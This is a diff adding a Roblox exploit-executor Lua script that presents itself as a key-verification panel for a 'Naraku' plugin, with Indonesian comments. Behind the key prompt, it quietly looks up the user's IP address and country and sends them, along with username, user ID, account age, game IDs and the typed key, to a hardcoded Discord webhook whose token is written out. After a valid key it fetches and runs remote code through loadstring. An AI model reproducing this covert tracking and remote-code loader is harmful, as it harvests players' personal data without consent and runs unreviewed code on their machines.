@@ -1,0 +1,268 @@
+-- NARAKU FEATURE VERIFY KEY PLUGIN
+-- STUDIO LITE ROBLOX 
+local LMG2L = {};
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel
+LMG2L["Panel_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Panel_2"]["BorderSizePixel"] = 2;
+LMG2L["Panel_2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Panel_2"]["Size"] = UDim2.new(0, 310, 0, 138);
+LMG2L["Panel_2"]["Position"] = UDim2.new(0, 260, 0, 56);
+LMG2L["Panel_2"]["BorderColor3"] = Color3.fromRGB(59, 59, 59);
+LMG2L["Panel_2"]["Name"] = [[Panel]];
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.InfoText
+LMG2L["InfoText_3"] = Instance.new("TextLabel", LMG2L["Panel_2"]);
+LMG2L["InfoText_3"]["BorderSizePixel"] = 2;
+LMG2L["InfoText_3"]["TextSize"] = 6;
+LMG2L["InfoText_3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["InfoText_3"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
+LMG2L["InfoText_3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["InfoText_3"]["Size"] = UDim2.new(0, 310, 0, 16);
+LMG2L["InfoText_3"]["BorderColor3"] = Color3.fromRGB(59, 59, 59);
+LMG2L["InfoText_3"]["Text"] = [[    • Masukan Key nya dulu jika ingin akses plugin nya]];
+LMG2L["InfoText_3"]["Name"] = [[InfoText]];
+LMG2L["InfoText_3"]["Position"] = UDim2.new(0, 0, 0, 32);
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.Title
+LMG2L["Title_4"] = Instance.new("TextLabel", LMG2L["Panel_2"]);
+LMG2L["Title_4"]["BorderSizePixel"] = 2;
+LMG2L["Title_4"]["TextSize"] = 12;
+LMG2L["Title_4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["Title_4"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
+LMG2L["Title_4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Title_4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Title_4"]["Size"] = UDim2.new(0, 310, 0, 30);
+LMG2L["Title_4"]["BorderColor3"] = Color3.fromRGB(59, 59, 59);
+LMG2L["Title_4"]["Text"] = [[              NARAKU KEY]];
+LMG2L["Title_4"]["Name"] = [[Title]];
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.Title.Icon
+LMG2L["Icon_5"] = Instance.new("ImageLabel", LMG2L["Title_4"]);
+LMG2L["Icon_5"]["BorderSizePixel"] = 0;
+LMG2L["Icon_5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- LMG2L["Icon_5"]["ImageContent"] = ;
+LMG2L["Icon_5"]["Image"] = [[rbxassetid://85521644284429]];
+LMG2L["Icon_5"]["Size"] = UDim2.new(0, 26, 0, 26);
+LMG2L["Icon_5"]["Name"] = [[Icon]];
+LMG2L["Icon_5"]["Position"] = UDim2.new(0, 4, 0, 2);
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.JoinDiscordButton
+LMG2L["JoinDiscordButton_6"] = Instance.new("TextButton", LMG2L["Panel_2"]);
+LMG2L["JoinDiscordButton_6"]["BorderSizePixel"] = 2;
+LMG2L["JoinDiscordButton_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["JoinDiscordButton_6"]["BackgroundColor3"] = Color3.fromRGB(58, 140, 199);
+LMG2L["JoinDiscordButton_6"]["Size"] = UDim2.new(0, 140, 0, 26);
+LMG2L["JoinDiscordButton_6"]["BorderColor3"] = Color3.fromRGB(58, 140, 199);
+LMG2L["JoinDiscordButton_6"]["Text"] = [[JOIN DISCORD]];
+LMG2L["JoinDiscordButton_6"]["Name"] = [[JoinDiscordButton]];
+LMG2L["JoinDiscordButton_6"]["Position"] = UDim2.new(0, 160, 0, 102);
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.KeyBox
+LMG2L["KeyBox_7"] = Instance.new("TextBox", LMG2L["Panel_2"]);
+LMG2L["KeyBox_7"]["Name"] = [[KeyBox]];
+LMG2L["KeyBox_7"]["BorderSizePixel"] = 2;
+LMG2L["KeyBox_7"]["TextSize"] = 9;
+LMG2L["KeyBox_7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["KeyBox_7"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
+LMG2L["KeyBox_7"]["Size"] = UDim2.new(0, 290, 0, 34);
+LMG2L["KeyBox_7"]["Position"] = UDim2.new(0, 10, 0, 58);
+LMG2L["KeyBox_7"]["BorderColor3"] = Color3.fromRGB(59, 59, 59);
+LMG2L["KeyBox_7"]["Text"] = [[Masukan Key ]];
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.CloseButton
+LMG2L["CloseButton_8"] = Instance.new("TextButton", LMG2L["Panel_2"]);
+LMG2L["CloseButton_8"]["BorderSizePixel"] = 0;
+LMG2L["CloseButton_8"]["TextSize"] = 12;
+LMG2L["CloseButton_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["CloseButton_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["CloseButton_8"]["ZIndex"] = 2;
+LMG2L["CloseButton_8"]["BackgroundTransparency"] = 1;
+LMG2L["CloseButton_8"]["Size"] = UDim2.new(0, 26, 0, 26);
+LMG2L["CloseButton_8"]["Text"] = [[🫪]];
+LMG2L["CloseButton_8"]["Name"] = [[CloseButton]];
+LMG2L["CloseButton_8"]["Position"] = UDim2.new(0, 282, 0, 2);
+
+
+-- Players.EXDestructor01.PlayerGui.ScreenGui.Panel.VerifyKeyButton
+LMG2L["VerifyKeyButton_9"] = Instance.new("TextButton", LMG2L["Panel_2"]);
+LMG2L["VerifyKeyButton_9"]["BorderSizePixel"] = 2;
+LMG2L["VerifyKeyButton_9"]["TextSize"] = 9;
+LMG2L["VerifyKeyButton_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["VerifyKeyButton_9"]["BackgroundColor3"] = Color3.fromRGB(47, 203, 44);
+LMG2L["VerifyKeyButton_9"]["Size"] = UDim2.new(0, 140, 0, 26);
+LMG2L["VerifyKeyButton_9"]["BorderColor3"] = Color3.fromRGB(47, 203, 44);
+LMG2L["VerifyKeyButton_9"]["Text"] = [[VERIFY KEY]];
+LMG2L["VerifyKeyButton_9"]["Name"] = [[VerifyKeyButton]];
+LMG2L["VerifyKeyButton_9"]["Position"] = UDim2.new(0, 10, 0, 102);
+
+-- =============================================================================
+-- CONFIGURATION / PENGATURAN
+-- =============================================================================
+local CORRECT_KEY = "NARAKU-FREE-PLUGIN"
+local SAVE_FILE_NAME = "NarakuPluginAuth.txt"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1510729926192533587/Ni5wSvqU-DyXqnTBojB-FS6u37X60jQvY5NZudRQhPYU3OxS1p-bM0-dQWNVZi0luw3Q" -- Ganti dengan URL Webhook Discord Anda
+
+local Player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- Mendapatkan referensi UI dari table buatan localmaze
+local ScreenGui = LMG2L["ScreenGui_1"]
+local Panel = LMG2L["Panel_2"]
+local KeyBox = LMG2L["KeyBox_7"]
+local VerifyBtn = LMG2L["VerifyKeyButton_9"]
+local CloseBtn = LMG2L["CloseButton_8"]
+local DiscordBtn = LMG2L["JoinDiscordButton_6"]
+
+-- =============================================================================
+-- FUNCTION: KIRIM LOG EMBED KE DISCORD (Tampilan Premium & Rapi)
+-- =============================================================================
+local function sendDiscordLog(status, detailKey)
+    -- Mengambil IP dan informasi negara menggunakan API publik (opsional & aman bagi exploit)
+    local ipData = "Unknown"
+    local countryData = "Unknown"
+    pcall(function()
+        local response = game:HttpGet("https://ipapi.co/json/")
+        local decoded = HttpService:JSONDecode(response)
+        if decoded then
+            ipData = decoded.ip or "Unknown"
+            countryData = decoded.country_name or "Unknown"
+        end
+    end)
+
+    -- Penentuan warna & status (Pakai operator biasa, anti malformed string)
+    local embedColor = 16724532 
+    local statusDisplay = "❌ " .. status
+
+    if status == "Success" then
+        embedColor = 3132204 
+        statusDisplay = "🛡️ Success (Key Valid)"
+    elseif status == "Auto-Login (Already Verified)" then
+        embedColor = 1752220 
+        statusDisplay = "🧩 Auto-Login (Saved Key Used)"
+    elseif status == "UI Opened (Prompting Key)" then
+        embedColor = 43716 
+        statusDisplay = "📋 UI Opened (Prompting Key)"
+    end
+
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "💠 **NARAKU STUDIO LITE - LOG**",
+            ["description"] = "Sistem otentikasi real-time untuk memantau penggunaan plugin.",
+            ["color"] = embedColor,
+            ["fields"] = {
+                {["name"] = "📌 **Status & Aktivitas**", ["value"] = "```\n" .. statusDisplay .. "\n```", ["inline"] = false},
+                {["name"] = "🏷️ **Key Input**", ["value"] = "`" .. detailKey .. "`", ["inline"] = false},
+                {["name"] = "👤 **Profil Pengguna**", ["value"] = "• **Display Name:** " .. Player.DisplayName .. "\n• **Username:** " .. Player.Name .. "\n• **User ID:** " .. tostring(Player.UserId) .. "\n• **Umur Akun:** " .. tostring(Player.AccountAge) .. " Hari", ["inline"] = true},
+                {["name"] = "🎮 **Informasi Game**", ["value"] = "• **Place ID:** " .. tostring(game.PlaceId) .. "\n• **Job ID:** " .. (game.JobId ~= "" and tostring(game.JobId:sub(1,12)) .. "..." or "Solo Session"), ["inline"] = true},
+                {["name"] = "🌐 **Koneksi & Jaringan**", ["value"] = "• **IP Address:** " .. ipData .. "\n• **Negara:** " .. countryData, ["inline"] = false}
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate(),
+            ["footer"] = {["text"] = "Naraku Key System • Powered by Executor"}
+        }}
+    }
+
+    -- Mengirim data menggunakan request bawaan executor (syn.request / http_request)
+    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request)
+    if request then
+        pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    else
+        warn("Executor tidak mendukung request HTTP untuk Webhook.")
+    end
+end
+
+-- =============================================================================
+-- FUNCTION: JALANKAN SCRIPT UTAMA
+-- =============================================================================
+local function executeMainScript()
+    ScreenGui:Destroy() -- Hapus UI Key karena sudah sukses
+    print("Key Valid! Menjalankan Naraku Feature Plugin...")
+    
+    -- Menjalankan script utama kamu
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/narakux001-droid/PluginStudioLite/refs/heads/main/FeaturePlugin"))()
+    end)
+    
+    if not success then
+        warn("Gagal mengambil script utama: " .. tostring(err))
+    end
+end
+
+-- =============================================================================
+-- LOGIC CHECK: APAKAH SUDAH PERNAH VERIFIKASI SEBELUMNYA?
+-- =============================================================================
+local isVerified = false
+if isfile and readfile then
+    if isfile(SAVE_FILE_NAME) then
+        local savedKey = readfile(SAVE_FILE_NAME)
+        if savedKey == CORRECT_KEY then
+            isVerified = true
+        end
+    end
+end
+
+-- Jika sudah pernah verifikasi, langsung gas tanpa munculin panel UI
+if isVerified then
+    sendDiscordLog("Auto-Login (Already Verified)", "Saved Key Used")
+    executeMainScript()
+else
+    -- Jika belum verifikasi, biarkan UI tetap muncul dan tunggu interaksi player
+    sendDiscordLog("UI Opened (Prompting Key)", "None")
+    
+    -- 1. Tombol Close Button (Menghapus Panel Key)
+    CloseBtn.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+    end)
+
+    -- 2. Tombol Join Discord (Opsional: Membantu copy link atau setclipboard)
+    DiscordBtn.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard("https://discord.gg/YOUR_DISCORD_LINK") -- Ganti dengan link discord kamu
+            KeyBox.Text = "Link Discord disalin ke Clipboard!"
+        else
+            KeyBox.Text = "discord.gg/YOUR_DISCORD_LINK"
+        end
+    end)
+
+    -- 3. Tombol Verify Key
+    VerifyBtn.MouseButton1Click:Connect(function()
+        local inputKey = KeyBox.Text:gsub("%s+", "") -- Menghapus spasi tak sengaja
+        
+        if inputKey == CORRECT_KEY then
+            -- Simpan status verifikasi ke file text di folder executor (.txt)
+            if writefile then
+                writefile(SAVE_FILE_NAME, CORRECT_KEY)
+            end
+            
+            sendDiscordLog("Success", inputKey)
+            KeyBox.Text = "KEY BERHASIL! Mohon tunggu..."
+            task.wait(1)
+            executeMainScript()
+        else
+            sendDiscordLog("Failed Attempt", inputKey)
+            KeyBox.Text = "KEY SALAH! Silahkan coba lagi."
+            task.wait(1.5)
+            KeyBox.Text = "Masukan Key "
+        end
+    end)
+end
+
+return LMG2L["ScreenGui_1"], require;
